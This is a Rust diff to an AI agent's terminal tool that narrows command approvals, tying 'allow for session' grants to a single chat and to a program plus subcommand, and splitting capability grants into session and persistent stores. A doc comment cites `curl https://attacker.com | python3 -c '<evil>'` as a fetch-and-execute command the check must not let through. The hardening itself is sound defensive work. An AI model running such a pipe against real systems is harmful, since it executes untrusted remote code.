@@ -4,12 +4,22 @@
 use super::*;
 
 impl TerminalTool {
-    pub(super) async fn is_allowed(&self, command: &str) -> bool {
+    /// Whether a grant covers `command`: the owner's full access, a
+    /// permanent prefix, or an "allow for session" given in `grant_session`
+    /// (never one given in another chat).
+    pub(super) async fn is_allowed(&self, command: &str, grant_session: &str) -> bool {
         if self.trust_all_enabled().await {
             return true;
         }
         let prefixes = self.allowed_prefixes.read().await;
         let trimmed = command.trim();
+        let sessions = self.session_approved.read().await;
+        let empty = HashSet::new();
+        let session = sessions.get(grant_session).unwrap_or(&empty);
+        // The exact command the owner allowed for this chat runs again.
+        if contains_shell_operator(trimmed) && session.contains(trimmed) {
+            return true;
+        }
         // A grant names a program. A command that launches another program
         // through it, writes a file by redirection or sets variables for it
         // does more than that program does, and is not covered.
@@ -19,11 +29,8 @@ impl TerminalTool {
         let has_shell_ops = contains_shell_operator(trimmed);
 
         // For chained commands (&&, ||, ;, |), check each segment's binary
-        // against both permanent and session-approved prefixes.
-        // This means approving `curl ... | python3 ...` also allows
-        // `curl ... | grep ...` since both curl and grep are safe/approved.
+        // against the permanent prefixes.
         if has_shell_ops {
-            let session = self.session_approved.read().await;
             // 1) Exact full-command match: session approvals store chained
             //    commands verbatim (`add_session_prefix`), and legacy
             //    permanent entries (pre-segment-binary `add_prefix`) stored
@@ -70,19 +77,18 @@ impl TerminalTool {
             return true;
         }
 
-        // Check session-approved prefixes
-        let session = self.session_approved.read().await;
-        session.iter().any(|prefix| {
-            trimmed == prefix.as_str()
-                || trimmed.starts_with(&format!("{} ", prefix))
-                || trimmed.starts_with(&format!("{}\t", prefix))
-        })
+        // Check session-approved keys (program and subcommand)
+        session
+            .iter()
+            .any(|key| trimmed == key.as_str() || covered_by_session_key(trimmed, key))
     }
 
-    /// Add a prefix to session-only approved list (cleared on restart).
+    /// Add a grant to `grant_session`'s "allow for session" list (cleared
+    /// on restart; never shared with another chat).
     ///
-    /// For SIMPLE commands (no shell operators), stores the first word as a
-    /// prefix — any future command starting with the same binary is allowed.
+    /// For SIMPLE commands (no shell operators), stores the program and its
+    /// subcommand ([`session_grant_key`]): later calls of that program
+    /// subcommand are allowed, other subcommands are not.
     ///
     /// For CHAINED commands (containing shell operators), stores ONLY the
     /// full trimmed command for exact-match matching. We intentionally do NOT
@@ -90,12 +96,11 @@ impl TerminalTool {
     /// `curl https://example.com | python3 -c '<safe>'` once must NOT later
     /// auto-allow `curl https://attacker.com | python3 -c '<evil>'`. The
     /// exact-match check in `is_allowed` handles legitimate re-runs.
-    pub(super) async fn add_session_prefix(&self, command: &str) {
+    pub(super) async fn add_session_prefix(&self, command: &str, grant_session: &str) {
         let trimmed = command.trim();
-        let mut session = self.session_approved.write().await;
+        let mut sessions = self.session_approved.write().await;
+        let session = sessions.entry(grant_session.to_string()).or_default();
         if contains_shell_operator(trimmed) {
-            // Store the full chained command verbatim; matched exactly by
-            // `is_allowed`'s legacy full-command check.
             if session.insert(trimmed.to_string()) {
                 info!(
                     command = %trimmed,
@@ -103,15 +108,11 @@ impl TerminalTool {
                 );
             }
         } else {
-            let key = trimmed
-                .split_whitespace()
-                .next()
-                .unwrap_or(trimmed)
-                .to_string();
+            let key = session_grant_key(trimmed);
             if session.insert(key.clone()) {
                 info!(
                     prefix = %key,
-                    "Added to session-approved prefixes (will reset on restart)"
+                    "Added to session-approved commands (will reset on restart)"
                 );
             }
         }
@@ -242,7 +243,7 @@ impl TerminalTool {
             return None;
         }
         let access = terminal_confined::confined_access(command)?;
-        if self.is_allowed(command).await {
+        if self.is_allowed(command, &trust.grant_session).await {
             return None;
         }
         Some(access)
@@ -373,13 +374,13 @@ impl TerminalTool {
             );
         }
         // `is_allowed` checks both permanent AND session-approved prefixes.
-        let is_allowed = self.is_allowed(command).await;
+        let is_allowed = self.is_allowed(command, &trust.grant_session).await;
         let requested_capabilities =
             Self::requested_capabilities(run_is_confined(self.confinement), args, trust);
         let capability_escalation_pending = !requested_capabilities.is_empty()
             && !trust.trusted_session
             && !self
-                .capabilities_granted(command, &requested_capabilities)
+                .capabilities_granted(command, &requested_capabilities, &trust.grant_session)
                 .await;
         debug!(command = %command, "Approval check");
         let needs_approval = if capability_escalation_pending {
@@ -704,14 +705,24 @@ impl TerminalTool {
             Some(ApprovalResponse::AllowOnce) => {}
             Some(ApprovalResponse::AllowSession) => {
                 // Session-only storage (cleared on restart).
-                self.add_session_prefix(command).await;
-                self.add_capability_grants(command, &requested_capabilities, false)
-                    .await;
+                self.add_session_prefix(command, &trust.grant_session).await;
+                self.add_capability_grants(
+                    command,
+                    &requested_capabilities,
+                    false,
+                    &trust.grant_session,
+                )
+                .await;
             }
             Some(ApprovalResponse::AllowAlways) => {
                 self.add_prefix(command).await;
-                self.add_capability_grants(command, &requested_capabilities, true)
-                    .await;
+                self.add_capability_grants(
+                    command,
+                    &requested_capabilities,
+                    true,
+                    &trust.grant_session,
+                )
+                .await;
             }
             Some(ApprovalResponse::Deny) => {
                 if let Some(ref pool) = self.pool {
@@ -768,6 +779,7 @@ impl TerminalTool {
         &self,
         command: &str,
         capabilities: &[String],
+        grant_session: &str,
     ) -> bool {
         if capabilities.is_empty() {
             return true;
@@ -776,10 +788,16 @@ impl TerminalTool {
             return true;
         }
         let grants = self.capability_grants.read().await;
+        let session_grants = self.session_capability_grants.read().await;
         command_grant_keys(command).iter().all(|key| {
-            capabilities
-                .iter()
-                .all(|capability| grants.contains(&(key.clone(), capability.clone())))
+            capabilities.iter().all(|capability| {
+                grants.contains(&(key.clone(), capability.clone()))
+                    || session_grants.contains(&(
+                        grant_session.to_string(),
+                        key.clone(),
+                        capability.clone(),
+                    ))
+            })
         })
     }
 
@@ -788,8 +806,20 @@ impl TerminalTool {
         command: &str,
         capabilities: &[String],
         persist: bool,
+        grant_session: &str,
     ) {
         let keys = command_grant_keys(command);
+        if !persist {
+            let mut grants = self.session_capability_grants.write().await;
+            for key in keys {
+                for capability in capabilities {
+                    if grants.insert((grant_session.to_string(), key.clone(), capability.clone())) {
+                        info!(prefix = %key, capability = %capability, "Granted terminal capability for the session");
+                    }
+                }
+            }
+            return;
+        }
         let mut grants = self.capability_grants.write().await;
         for key in keys {
             for capability in capabilities {
@@ -797,9 +827,6 @@ impl TerminalTool {
                     continue;
                 }
                 info!(prefix = %key, capability = %capability, persist, "Granted terminal capability");
-                if !persist {
-                    continue;
-                }
                 if let Some(ref pool) = self.pool
                     && let Err(e) = crate::tools::terminal_grants::add_capability(
                         pool,
